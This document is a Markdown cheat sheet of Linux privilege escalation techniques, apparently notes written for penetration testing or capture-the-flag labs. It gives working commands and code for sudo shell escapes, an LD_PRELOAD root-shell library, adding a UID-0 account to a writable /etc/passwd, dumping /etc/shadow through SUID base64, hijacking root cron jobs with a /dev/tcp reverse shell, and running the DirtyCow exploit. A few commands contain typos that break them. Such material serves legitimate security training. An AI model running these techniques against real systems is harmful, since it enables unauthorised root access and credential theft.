# Linux Privesc

## Sudoers method

#### Exhaustive list
https://gtfobins.github.io/

```
➤ Check its current situation related to root privileges
kiosec@lab:/home$ sudo -l
```

```
➤ Python
sudo -u root /usr/bin/python
>>> from subprocess import call
>>> call(['/bin/bash'])

➤ Perl
sudo -u root /usr/bin/perl -e ‘`/bin/bash`’

➤ CP + Chmod
sudo -u root /bin/cp exploit exploit
sudo -u root /bin/chmod +xs exploit
./exploit

➤ Awk
awk 'BEGIN {system("/bin/bash")}'

➤ Less
• Solution 1 - read a file
sudo -u root /usr/bin/less /etc/shadow
 
• Solution 2 - create a file
sudo -u root /usr/bin/less 
then insert the following command :
!/bin/bash

➤ Vim
sudo -u victim /usr/bin/vim
then write the following command (same way to quit vim :!q):
:!/bin/bash

➤ Find
sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;

➤ Bash
sudo -u root /bin/bash

➤ Nmap
sudo -u nmap –interactive
nmap>!bash
or
nmap>!sh

➤ Mail
sudo mail --exec='!/bin/bash'
```

## LD_PRELOAD method
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

```
➤ Check for LD_PRELOAD (with the env_keep option)
kiosec@lab:/home$ sudo -l
Matching Default entries for user on this host:
	en_reset, env_keep+=LD_PRELOAD
<snip>

➤ Write a simple C code compiled as a share object (.so extension) file
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

➤ Compile the code
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

➤ Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```


## Writable files method
```
➤ Read/write sensitive files
/etc/passwd
/etc/group
/etc/profile
/etc/shadow

➤ Detect if the file is writable
ls -l /etc/passwd
-rwxrwxrwx. 1 root root 1306 Jan 10 21:30 /etc/passwd

➤ Privesc 01 : Delete the x of the root user in /etc/password
• By deleting the 'x', all users can substitute the root user. 
root:x:0:0:root:/root:/bin/bash
->
root::0:0:root:/root:/bin/bash

➤  Privesc 02 : Add another root user in /etc/password
echo "lexis:x:0:0:test:/root:/bin/bash" >> /etc/passwd
```

## SUID files method
```
➤  List files that have SUID (Set-user Identification) or SGID (Set-group Identification) bits set. These (S) allow files to be executed with the permission level of the file owner or the group owner, respectively.
• find / -type f -perm -04000 -ls 2>/dev/null
OR more valuable
• find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null 

➤  A good practice would be to compare executables on this list with GTFOBins
https://gtfobins.github.io/#+suid
```

#### Example
```
➤  Find SUID and SGID (base64 detected)
Kiosec@lab$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
<snip>
-rwsr-xr-x 1 root root 43352 Sep  5  2019 /usr/bin/base64
<snip>

➤  Verify that base64 is vulnerable to SUID attack
https://gtfobins.github.io/#+suid

➤  Follow the attack
• Method 01:
Kiosec@lab$cd /etc
Kiosec@lab/etc$ LFILE=shadow
Kiosec@lab/etc$ base64 "$LFILE" | base64 --decode
root:*:18561:0:99999:7:::
<snip>

• Method 02:
Kiosec@lab/etc$ base64 /etc/shadow | base64 --decode
root:*:18561:0:99999:7:::
<snip>

➤  Crack hashes using john
```

## Capabilities method

If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.

```
➤ 1. Detect the Capabilities with CAP_SETUID (i.e. When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null)
Kiosec@lab$getcap -r / 2>/dev/null

➤ 2. Check if the binaries founded can be leveraged for privesc.
https://gtfobins.github.io/#
```

## Crontab method
```
➤ 1. Check the cont job configurations stored as contabs  (cron tables)
kiosec@lab:/home$ cat /etc/crontab

Notes: Be careful with the PATH included at the beginning of the crontab file (first lines)

➤ 2. Identify the cron job set by root

➤ 3. For each of cron job identified, detect if the script can be modify (ex: script can be modify, can be remove or replace in the folder)
kiosec@lab:/home$ ls -al xxxx

➤ 4. Modify the script with a reverse shell or a privilege escalation payloads

➤ 4 BIS. Sometimes, the cron job is present in the crontab but the associated script does not exist. In this case, check if it is possible to write in the corresponding folder, then create a malicious script with the name. As example :

kiosec@lab:/home$ cat /etc/crontab
* * * * *  root /tmp/test.sh #Script located in tmp and run with root privileges
<snip>

kiosec@lab:/home$ ls -al
ls: cannot access '/tmp/test.sh': No such file or directory # The script does not exist
OR
kiosec@lab:/home$ locate test.py

kiosec@lab:/home$ echo "YOUR_PAYLOAD" >> /tmp/test.sh
OR
kiosec@lab:/home$ vim /tmp/test.sh
#!bin/bash
/bin/sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

## Path method
```
```

## DirtyCow exploit

Exploit: Linux Kernel 2.6.22 < 3.9

• https://dirtycow.ninja/

• https://github.com/FireFart/dirtycow/blob/master/dirty.c


```
➤ 1. Upload the exploit on the victim

➤ 2. Compile the exploit
gcc -pthread dirty.c -O dirty -lcrypt
chmod +x dirty

➤ 3. exploit it
./dirty
Please enter the new password: lexiswashere

➤ 4. Privesc
su firefart
Password: lexiswashere

Note: if the 'su : must be run from a terminal' error appear, upgrade tty 
python -c 'import pty; pty.spawn("/bin/sh")'
```
